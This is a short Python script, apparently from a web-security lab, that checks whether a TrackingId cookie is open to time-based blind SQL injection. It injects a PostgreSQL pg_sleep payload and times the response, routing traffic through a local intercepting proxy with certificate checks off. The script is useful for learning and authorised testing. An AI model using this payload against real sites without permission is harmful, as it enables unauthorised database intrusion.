import sys, requests, urllib3, urllib
import time as t
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http:127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'VvqW8sZvC4OtJOLW' + sqli_payload_encoded, 'session': 'HT2A2vFuloIa2eB2dNOLbwmQnfTUW2IY'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    print(f"Response Time : {float(r.elapsed.total_seconds())}")
    if float(r.elapsed.total_seconds()) > 10.00 :
        print("[+] Vulnerable to blind-based SQL injection")
    else:
        print("[-] Not vulnerable to blind based SQL injection")


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Checking if tracking cookie is vulnerable to time-based blind SQLi....")
    blind_sqli_check(url)

if __name__ == "__main__":
    main()
